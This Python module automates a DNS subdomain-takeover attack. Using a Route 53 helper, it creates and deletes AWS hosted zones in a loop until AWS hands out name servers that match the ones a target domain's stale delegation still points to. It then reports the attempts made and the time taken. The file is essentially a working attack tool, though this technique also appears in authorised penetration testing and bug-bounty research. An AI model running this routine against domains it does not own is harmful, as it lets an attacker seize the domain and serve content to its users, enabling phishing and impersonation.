from route53 import Route53Manager
import time
from logger_config import setup_logging

logger = setup_logging()


def brute_force(manager: Route53Manager, domain_name, target_ns, attempt_limit):
    """
    Perform brute force attempts to generate and delete Route 53 hosted zones.

    :param domain_name: The domain name for the hosted zone.
    :param target_ns: List of target name servers (max 4 items).
    :param attempt_limit: Maximum number of attempts.
    :return: Status object indicating success, domain name, target name servers, found name server, attempt count, and elapsed time.
    """
    parent_domain = ".".join(domain_name.rstrip(".").split(".")[1:])
    attempts = 0
    start_time = time.time()

    while attempts < attempt_limit:
        attempts += 1
        logger.info(f"Attempt {attempts}: Creating hosted zone for {parent_domain}")


        zone_id, name_servers = manager.create_zone(parent_domain, tags=[])
        logger.info(f"Zone ID: {zone_id}, got AWS name servers: {name_servers}")

        if any(ns in name_servers for ns in target_ns):
            elapsed_time = time.time() - start_time
            response_obj = {
                "success": True,
                "domain_name": domain_name,
                "target_ns": target_ns,
                "found_ns": name_servers,
                "attempts": attempts,
                "elapsed_time": elapsed_time,
            }
            logger.info(response_obj)
            return response_obj

        manager.delete_zone(zone_id)

    elapsed_time = time.time() - start_time
    response_obj = {
        "success": False,
        "domain_name": domain_name,
        "target_ns": target_ns,
        "found_ns": None,
        "attempts": attempts,
        "elapsed_time": elapsed_time,
    }
    logger.info(response_obj)
    return response_obj
